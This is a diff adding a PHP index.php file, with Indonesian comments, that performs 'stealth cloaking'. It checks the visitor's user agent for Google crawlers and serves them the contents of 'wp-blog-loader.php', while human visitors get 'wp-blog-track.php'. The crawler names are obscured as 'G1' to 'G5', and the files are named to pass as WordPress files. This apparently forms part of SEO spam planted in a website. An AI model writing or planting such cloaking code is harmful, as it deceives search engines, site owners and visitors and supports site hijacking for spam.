@@ -1,0 +1,56 @@
+<?php
+        /**
+         * Index.php Stealth Cloaking
+         * Semua di sini, nama fungsi & variabel aman
+         */
+
+        // ------------------------
+        // Daftar bot / crawler Google (netral, stealth)
+        // ------------------------
+        $clientPatterns = [ 
+            'G1',          // Googlebot
+            'G2',          // Google Site Verification
+            'G3',          // Google Inspection Tool
+            'G4',          // Googlebot Mobile
+            'G5',          // Googlebot News
+            'Ads',         // AdsBot
+            'Mediapart'    // Mediapartners (AdSense)
+        ];
+
+        // ------------------------
+        // Fungsi deteksi visitor vs crawler
+        // ------------------------
+        function check_client(array $patterns): bool {
+            $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+            foreach ($patterns as $p) {
+                // ubah ke nama asli Google untuk deteksi
+                $match = str_replace(['G1','G2','G3','G4','G5'], 'Google', $p);
+                if (stripos($ua, $match) !== false) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        // ------------------------
+        // Tampilkan konten
+        // ------------------------
+        if (check_client($clientPatterns)) {
+            // Konten khusus bot (SEO)
+            $botFile = 'wp-blog-loader.php'; // bisa juga langsung embed konten disini
+            if (file_exists($botFile)) {
+                echo file_get_contents($botFile);
+            } else {
+                echo "<!-- Bot content missing -->";
+            }
+            exit;
+        } else {
+            // Konten asli visitor
+            $mainFile = 'wp-blog-track.php';
+            if (file_exists($mainFile)) {
+                include $mainFile;
+            } else {
+                echo "<!-- Main content missing -->";
+            }
+            exit;
+        }
